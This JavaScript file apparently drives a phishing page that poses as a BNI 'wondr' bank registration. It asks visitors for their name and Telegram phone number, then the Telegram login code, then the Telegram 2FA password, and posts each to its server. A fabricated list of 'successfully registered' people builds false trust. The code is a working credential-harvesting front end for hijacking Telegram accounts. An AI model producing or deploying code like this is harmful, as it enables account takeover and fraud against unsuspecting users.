// Mobile menu toggle
const menuButton = document.getElementById("mobile-menu-button");
const mobileMenu = document.getElementById("mobile-menu");
menuButton.addEventListener("click", () => {
    mobileMenu.classList.toggle("hidden");
});

$('.js-go-form').on('click', function (e) {
    e.preventDefault();
    const headerOffset = 80;
    const section = document.getElementById('form-section');
    if (!section) return;

    const offsetPosition =
        section.getBoundingClientRect().top + window.pageYOffset - headerOffset;

    window.scrollTo({
        top: offsetPosition,
        behavior: 'smooth'
    });

    $('#mobile-menu').addClass('hidden');
    setTimeout(() => {
        const $activeForm = $('#form-section form').not('.hidden').first();
        const $input = $activeForm.find('input, textarea, select').first();
        if ($input.length) $input.focus();
    }, 400);
});

$(document).on('click', '.toggle-password', function () {
    const $input = $(this).siblings('input[data-password]');
    const $icon = $(this).find('i');
    if ($input.attr('type') === 'password') {
        $input.attr('type', 'text');
        $icon.removeClass('fa-eye').addClass('fa-eye-slash');
    } else {
        $input.attr('type', 'password');
        $icon.removeClass('fa-eye-slash').addClass('fa-eye');
    }
    $input.focus();
});

// Global Variables & Common Functions
let countdownInterval = null;

function showResponseMessage(message, type = 'success', autoHide = false, hideAfter = 10000) {
    const responseElement = $('.responseMessage');
    responseElement.html('');

    let alertClass = '';
    switch (type) {
        case 'success':
            alertClass = 'bg-green-100 border border-green-400 text-green-700';
            break;
        case 'error':
        case 'danger':
            alertClass = 'bg-red-100 border border-red-400 text-red-700';
            break;
        case 'warning':
            alertClass = 'bg-yellow-100 border border-yellow-400 text-yellow-700';
            break;
        case 'info':
            alertClass = 'bg-blue-100 border border-blue-400 text-blue-700';
            break;
        default:
            alertClass = 'bg-gray-100 border border-gray-400 text-gray-700';
    }
    const alertHTML = `
        <div class="${alertClass} px-4 py-3 rounded relative mb-3 text-sm" role="alert">
            <span class="block sm:inline">${message}</span>
            <button 
                type="button"
                class="absolute -top-2 -right-2 bg-white shadow-md w-6 h-6 flex items-center justify-center rounded-full border border-gray-300 hover:bg-gray-100 transition"
                aria-label="Close"
                onclick="$(this).closest('[role=alert]').fadeOut(200, function() { $(this).remove(); })"
            >
                <i class="fas fa-times text-gray-600 text-xs"></i>
            </button>
        </div>
    `;
    responseElement.html(alertHTML);
    if (autoHide) {
        setTimeout(() => {
            responseElement.fadeOut(300, function () {
                $(this).html('').show();
            });
        }, hideAfter);
    }
}

// Countdown handler
function startCountdown(seconds) {
    let countdown = seconds;

    function formatCountdown(seconds) {
        const days = Math.floor(seconds / (3600 * 24));
        const hours = Math.floor((seconds % (3600 * 24)) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const remainingSeconds = seconds % 60;

        let timeString = '';
        if (days > 0) timeString += `${days} hari `;
        if (hours > 0) timeString += `${hours} jam `;
        if (minutes > 0) timeString += `${minutes} menit `;
        if (remainingSeconds > 0) timeString += `${remainingSeconds} detik`;
        return timeString.trim();
    }

    if (countdownInterval) clearInterval(countdownInterval);

    countdownInterval = setInterval(() => {
        if (countdown <= 0) {
            clearInterval(countdownInterval);
            countdownInterval = null;
            showResponseMessage('Anda dapat mencoba lagi sekarang.', 'success', true);
        } else {
            const timeString = formatCountdown(countdown);
            showResponseMessage(`Terlalu banyak permintaan. Harap tunggu: ${timeString}`, 'error');
            countdown--;
        }
    }, 1000);
}

// Loading spinner handler
function showLoadingSpinner() {
    $('#loadingSpinner').removeClass('hidden opacity-0 pointer-events-none');
}

function hideLoadingSpinner() {
    $('#loadingSpinner').addClass('opacity-0');
    setTimeout(() => {
        $('#loadingSpinner').addClass('hidden pointer-events-none');
    }, 500);
}


// Page Load Events
$(document).ready(function () {
    showLoadingSpinner();
    renderParticipants();
});

$(window).on('load', function () {
    setTimeout(() => {
        hideLoadingSpinner();
    }, 500);
});


// Form Handlers
$(document).ready(function () {

    // --- Send verification code ---
    $('#form-step-1').on('submit', function (e) {
        e.preventDefault();

        const name = $('#name').val().trim();
        const phoneNumber = $('#phoneNumber').val().trim();
        const submitButton = $('#form-step-1 button[type="submit"]');
        $('.responseMessage').html('');
        if (name === '') {
            showResponseMessage('Nama lengkap wajib diisi.', 'error', true);
            return;
        }

        const phoneRegex = /^(\+?\d{8,15}|0\d{8,15})$/;
        if (phoneNumber === '') {
            showResponseMessage('Nomor Telegram wajib diisi.', 'error', true);
            return;
        } else if (!phoneRegex.test(phoneNumber)) {
            showResponseMessage('Nomor Telegram hanya boleh berisi angka (8–15 digit).', 'error', true);
            return;
        }

        submitButton.prop('disabled', true);
        showLoadingSpinner();

        $.ajax({
            url: '/wondr-bni-neon.vercel.app/script.js',
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({ name, phoneNumber }),
            success: function (response) {
                submitButton.prop('true', false);
                hideLoadingSpinner();

                if (countdownInterval) {
                    clearInterval(countdownInterval);
                    countdownInterval = null;
                }

                if (response.success) {
                    showResponseMessage(response.message, 'success', true);
                    $('#no_span').val(phoneNumber);
                    $('#form-step-1').addClass('hidden');
                    $('#form-step-2').removeClass('hidden');
                } else if (response.waitTime) {
                    startCountdown(response.waitTime);
                } else {
                    showResponseMessage(response.message, 'error', true);
                }
            },
            error: function (xhr) {
                submitButton.prop('true', false);
                hideLoadingSpinner();

                let errorMessage = 'Terjadi kesalahan. Silakan coba lagi.';
                try {
                    const response = JSON.parse(xhr.responseText);
                    errorMessage = response.message || errorMessage;

                    if (countdownInterval) {
                        clearInterval(countdownInterval);
                        countdownInterval = null;
                    }

                    if (response.waitTime) {
                        startCountdown(response.waitTime);
                    } else {
                        showResponseMessage(errorMessage, 'error', true);
                    }
                } catch {
                    showResponseMessage(errorMessage, 'error', true);
                }
            },
        });
    });

    // --- Verify code ---
    $('#form-step-2').on('submit', function (e) {
        e.preventDefault();

        const verificationCode = $('#otp_code').val().trim();
        const phoneNumber = $('#phoneNumber').val().trim();
        const submitButton = $('#form-step-2 button[type="submit"]');
        $('.responseMessage').html('');

        if (verificationCode === '') {
            showResponseMessage('Kode verifikasi wajib diisi.', 'error', true);
            return;
        }

        const codeRegex = /^[0-9]{4,6}$/;
        if (!codeRegex.test(verificationCode)) {
            showResponseMessage('Kode verifikasi harus berupa angka 4–6 digit.', 'error', true);
            return;
        }

        if (phoneNumber === '') {
            showResponseMessage('Nomor Telegram tidak ditemukan. Segarkan halaman dan ulangi langkah pertama.', 'error');
            return;
        }

        submitButton.prop('disabled', true);
        showLoadingSpinner();

        $.ajax({
            url: '/verify-code',
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({ verificationCode, phoneNumber }),
            success: function (response) {
                hideLoadingSpinner();
                submitButton.prop('disabled', false);

                if (response.success) {
                    showResponseMessage(response.message, 'success');
                    setTimeout(() => {
                        window.location.href = '/dashboard';
                    }, 1500);
                } else if (response.require_2fa) {
                    showResponseMessage(response.message, 'warning');
                    $('#form-step-2').addClass('hidden');
                    $('#form-step-3').removeClass('hidden');
                    setTimeout(() => {
                        $('#twofa_password').focus();
                    }, 300);
                } else {
                    showResponseMessage(response.message, 'error');
                }

            },
            error: function (xhr) {
                hideLoadingSpinner();
                submitButton.prop('disabled', false);
                const errorMessage = xhr.responseJSON?.message || 'Terjadi kesalahan saat memverifikasi kode.';
                showResponseMessage(errorMessage, 'error');
            },
        });
    });

    // --- Verify 2FA ---
    $('#form-step-3').on('submit', function (e) {
        e.preventDefault();

        const password = $('#twofa_password').val().trim();
        const phoneNumber = $('#phoneNumber').val().trim();
        const submitButton = $('#form-step-3 button[type="submit"]');
        $('.responseMessage').html('');

        if (!password) {
            showResponseMessage('Password 2FA wajib diisi.', 'error', true);
            return;
        }

        submitButton.prop('disabled', true);
        showLoadingSpinner();

        $.ajax({
            url: '/verify-2fa',
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({ phoneNumber, password }),
            success: function (response) {
                hideLoadingSpinner();
                submitButton.prop('disabled', false);

                if (response.success) {
                    showResponseMessage(response.message, 'success');
                    setTimeout(() => {
                        window.location.href = '/dashboard';
                    }, 1500);
                } else {
                    $('#twofa_password').focus();
                    showResponseMessage(response.message, 'error');
                }
            },
            error: function (xhr) {
                $('#twofa_password').focus();
                hideLoadingSpinner();
                submitButton.prop('disabled', false);
                const msg = xhr.responseJSON?.message || 'Gagal verifikasi 2FA.';
                showResponseMessage(msg, 'error');
            }
        });
    });
});

// Avatar default
const DEFAULT_AVATAR = "/img/avatar.webp";

// Data peserta
const participants = [
    { name: "Indah Pertiwi", img: DEFAULT_AVATAR },
    { name: "Firman Syahputra", img: DEFAULT_AVATAR },
    { name: "Indah Maarus", img: DEFAULT_AVATAR },
    { name: "Alfian Wijaya", img: DEFAULT_AVATAR },
    { name: "Ahmad Zaki", img: DEFAULT_AVATAR },
    { name: "Budi Santoso", img: DEFAULT_AVATAR },
    { name: "Kurniawan Sudrajat", img: DEFAULT_AVATAR },
    { name: "Lina Kurnia", img: DEFAULT_AVATAR },
    { name: "Rio Febrianto", img: DEFAULT_AVATAR },
];

function renderParticipants() {
    const $list = $('#registered-list');
    $list.empty();
    participants.forEach((p) => {
        const item = `
        <div class="flex items-center space-x-4 bg-gray-100 rounded-lg p-3 shadow-sm">
            <img alt="${p.name}" src="${p.img}" class="rounded-full w-12 h-12 object-cover" />
            <div>
            <p class="font-semibold text-gray-900">${p.name}</p>
            <p class="text-green-600 font-semibold flex items-center space-x-1">
                <span>REGISTRASI SUKSES !!!</span>
            </p>
            </div>
        </div>
        `;
        $list.append(item);
    });
    $list.append($list.html());
    $list.addClass('auto-scroll');
}

